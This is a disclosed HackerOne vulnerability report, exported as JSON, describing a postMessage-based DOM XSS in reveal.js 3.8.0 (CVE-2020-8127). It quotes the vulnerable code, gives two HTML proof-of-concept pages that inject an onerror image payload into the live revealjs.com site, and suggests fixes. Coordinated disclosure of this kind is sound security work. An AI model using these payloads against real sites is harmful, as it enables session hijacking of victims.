{
  "id": 691977,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTE5Nzc=",
  "url": "https://hackerone.com/reports/691977",
  "title": "[reveal.js] XSS by calling arbitrary method via postMessage",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-09-10T18:29:45.135Z",
  "submitted_at": "2019-09-10T18:29:45.135Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "s_p_q_r",
    "url": "/s_p_q_r",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8127"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-02-18T13:55:42.321Z",
  "bug_reporter_agreed_on_going_public_at": "2020-02-18T13:55:42.256Z",
  "team_member_agreed_on_going_public_at": "2020-02-05T09:28:47.547Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report XSS in reveal.js\nIt allows gaining access to the victim's account and performing actions on his behalf\n\n# Module\n\n**module name:** reveal.js\n**version:** 3.8.0\n**npm page:** `https://www.npmjs.com/package/reveal.js`\n\n## Module Description\n\n> A framework for easily creating beautiful presentations using HTML. Check out the live demo.\n> \n> reveal.js comes with a broad range of features including nested slides, Markdown contents, PDF export, speaker notes and a JavaScript API. There's also a fully featured visual editor and platform for sharing reveal.js presentations at slides.com.\n\n## Module Stats\n\n[N/A] downloads in the last day\n[4666] downloads in the last week\n[N/A] downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `setupPostMessage` function accepts messages from arbitrary origins and allows calling any method available in Reveal:\n\n```javascript\nfunction setupPostMessage() {\n\t\n\tif( config.postMessage ) {\n\t\twindow.addEventListener( 'message', function ( event ) {\n\t\t\tvar data = event.data;\n\t\t\t\n\t\t\t// Make sure we're dealing with JSON\n\t\t\tif( typeof data === 'string' && data.charAt( 0 ) === '{' && data.charAt( data.length - 1 ) === '}' ) {\n\t\t\t\tdata = JSON.parse( data );\n\n\t\t\t\t// Check if the requested method can be found\n\t\t\t\tif( data.method && typeof Reveal[data.method] === 'function' ) {\n\t\t\t\t\tReveal[data.method].apply( Reveal, data.args );\n\t\t\t\t}\n\t\t\t}\n\t\t}, false );\n\t}\n}\n```\n\nFor the proof of concept let's consider the `addKeyBinding` method. It pushes the provided key data (code, description and callback) into the `registeredKeyBindings` array:\n\n```javascript\nfunction addKeyBinding( binding, callback ) {\n\t\n\tif( typeof binding === 'object' && binding.keyCode ) {\n\t\tregisteredKeyBindings[binding.keyCode] = {\n\t\t\tcallback: callback,\n\t\t\tkey: binding.key,\n\t\t\tdescription: binding.description\n\t\t};\n\t}\n\telse {\n\t\tregisteredKeyBindings[binding] = {\n\t\t\tcallback: callback,\n\t\t\tkey: null,\n\t\t\tdescription: null\n\t\t};\n\t}\n\t\n}\n```\n\nwhich in its turn is put into HTML without sufficient validation within the `showHelp` method:\n\n```javascript\nfunction showHelp() {\n\t\n\t...\n\t\n\tfor( var binding in registeredKeyBindings ) {\n\t\tif( registeredKeyBindings[binding].key && registeredKeyBindings[binding].description ) {\n\t\t\thtml += '<tr><td>' + registeredKeyBindings[binding].key + '</td><td>' + registeredKeyBindings[binding].description + '</td></tr>';\n\t\t}\n\t}\n\t\n\t...\n\t\n}\n```\n\nAll in all this allows the attacker to perform XSS via postMessage by submitting payloads in its data (PoC against the https://revealjs.com homepage):\n\n```html\n<html>\n    <head>\n        <title>XSS</title>\n        \n\t\t<style>\n\t\t\tiframe\n\t\t\t{\n\t\t\t\twidth: 100%;\n\t\t\t\theight: 100%;\n\t\t\t\tborder: none;\n\t\t\t}\n\t\t</style>\n    </head>\n    <body>\n        <iframe name=\"reveal\" src=\"https://revealjs.com\" onload=\"xss()\"></iframe>\n\n        <script>\n            var frame = window.frames.reveal\n            \n            function xss ()\n            {\n                frame.postMessage ('{\"method\":\"addKeyBinding\",\"args\":[{\"keyCode\":666,\"key\":\"Pwned\",\"description\":\"<img src=x onerror=alert(document.domain)>\"}]}', '*')\n                frame.postMessage ('{\"method\":\"toggleHelp\"}', '*')\n            }\n        </script>\n    </body>\n</html>\n```\n\nhttp://spqr.zz.mu/reveal.php\n\n```html\n<script>\n    var win = window.open ('https://revealjs.com')\n    \n    function xss ()\n    {\n        win.postMessage ('{\"method\":\"addKeyBinding\",\"args\":[{\"keyCode\":666,\"key\":\"Pwned\",\"description\":\"<img src=x onerror=alert(document.domain)>\"}]}', '*')\n        win.postMessage ('{\"method\":\"toggleHelp\"}', '*')\n    }\n    \n    setTimeout (xss, 500)\n</script>\n```\n\nhttp://spqr.zz.mu/reveal_open.php\n\n\n## Steps To Reproduce:\n\nOpen one of these links in any browser and wait for the page to load:\n\n* http://spqr.zz.mu/reveal.php\n* http://spqr.zz.mu/reveal_open.php\n\n{F579591}\n\n## Patch\n\n* Use secure HTML assignment at the `showHelp` method\n* Check other available methods for similar vulnerabilites\n* By default allow calling secure methods only\n* By default turn on secure configs only\n* Prohibit overriding them via seach params\n* By default allow messages from whitelisted origins only\n\n## Supporting Material/References:\n\n- Any\n- 4.0.0 or later\n- Any\n- Any\n- Any\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n# Hunter's comments and funny memes goes here\n\n[Presentation with reveal.js about xss](https://github.com/fabidick22/presentation-xss)\n\n{F579592}\n\n## Impact\n\nGaining access to the victim's account and performing actions on his behalf",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 579592,
      "file_name": "xss_dawg.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Cc48fxrkrT12U74PTB6MEP2V?response-content-disposition=attachment%3B%20filename%3D%22xss_dawg.jpg%22%3B%20filename%2A%3DUTF-8%27%27xss_dawg.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7HKROB63%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T122642Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC0YDW%2FWBZ6pTL7VRNkKeI7gmM82i2U9cgqHyUoGtLJzQIgKWqqlXVr3oD3xZ02l9oKjqzyRDld8qnt0PdcJYCK6AAqsgUIFBADGgwwMTM2MTkyNzQ4NDkiDI7VIHEHzVmhJKE%2BkCqPBWMMn9RohWpSEZTGCLV3Kw3nLFPDCrYKLc7CvwPaYW0j11wEIbEqliuaSaQ%2FDixk6EjQWHEL8BaMumVWshyfF8aeB8trWUlVyeeWeECI7Q4dXEPV8bfHMjJa3LgK1hf6cJ7pkCfcxH%2FkbjZS6C3IzDpeNXS87vNrZDbV2M6r0hdKSkE4M3sgMJqIEDdAkzOZZk%2BmFNEr7lGWshY4p1HopXp4HOlN3nyWHC2aE6e3x6MHwypaXOqcd4ui0COfDCubkzSvXsMrw1P2yZsDbLcBILJfl2MC%2Blztg4FshYojzRIvRjXqRpEvQ2eLrUcrf0rcZ%2BoiHQIx8fUdtkCtGJ1g3TFHV7NqyNR0fQZVFsWpym2w%2F6ojDBORrJV6%2FVAQrs9gFLuW0E823Prvukt8YvLLzhdsBa75Xuc%2BSf4sC0PCvewrKhyvwGwSWQfwlSe8OoWiMm7ZPV85phx86qKaWxkzoGZ0PDyeRvedVopEQvj43trcxnawx14xJWnu4xDZZY0JMg8ZK1CFUO8Ll0lTpFawUyScQYUTeqR5KUjPB23jhglMpGgh%2Bgpuh5TDzaUgDUNecqIOrW1VaMwpoELXPjlQkr3KUAMz7%2BxuMpAkRSFqWMNsZIXBLQpBcB6HwyX9vuKfeqlZOGakst7kCmASMY5Z94yNQvI4TLfpNVO62pbky0Xgk1KYBc%2BfSAGBqM%2BV59TIl64t6Ssz68nyXwz8RaRnLb%2B8ALpUIinP4divhRtW1GSEySLQzJKe19%2Bw8OA0ImYmFb4y7mAjdD9UOKaHmD4bEVROpIFppiXoeLp9aKIaGdodHrSWo6ox8V%2BcxW3aXXioa0VU4%2FDlyu0qZSV4UQm31p3cu7j2pfPF113go63iePwwurC%2FxgY6sQFTFXfPSAUbM9al00OCSpcHYB8cJXjRt1U5BBMa4GKhYOz9W4%2BVNsvgpBI5FoYYewmkq1x4Hkxl0ZLnQC1ZZuT0Q4SQDB6UPs1%2B044H6ajFJkCWt5OAxagj7yLJ7ctl1%2BNrPBPSlu6YsZFmgPZgvfU65ZPvAArq9%2B6AG%2FMP9r7QW9DpFc1iZy1GmGPQjQndRSzo%2BGCrCc%2BL6Hz%2BQcKxYag1n1SuF4tOWKpwGzl8fiI7g%2Fk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efe7c48af714031e914f2b576a2b8da243f551abd1f1dc0c6e00975a7e1ee11e",
      "file_size": 73043,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-03-06T09:28:47.640Z",
  "allow_singular_disclosure_after": -174970675.28024676,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "alienisgrinding",
    "a_d_a_m",
    "nightm4re",
    "leonishan",
    "savitar0x01",
    "khizer47",
    "sa12345"
  ],
  "severity": {
    "rating": "medium",
    "score": 5.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 17515,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "reveal.js",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
